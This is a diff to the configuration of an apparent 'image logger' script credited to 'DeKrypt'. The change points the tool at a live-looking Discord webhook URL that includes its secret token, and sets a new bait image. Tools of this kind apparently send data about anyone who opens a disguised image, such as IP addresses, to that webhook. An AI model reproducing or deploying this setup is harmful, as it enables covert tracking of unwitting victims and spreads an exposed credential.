@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://imagilogger.vercel.app/image.png",
-    "image": "https://wallpapers.com/images/featured-full/hd-nature-ngdfb9h966h4z3le.jpg", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1490490656840487034/sTX8BCA3c_rqYVgF7Rh-5GA25tcyiDWivXamMwwGhrJ0WShw3EFuhMxnmScW7_dKtlzH",
+    "image": "https://i.pinimg.com/236x/51/fc/af/51fcaff8616d09f6893b9ee52efe7dfb.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
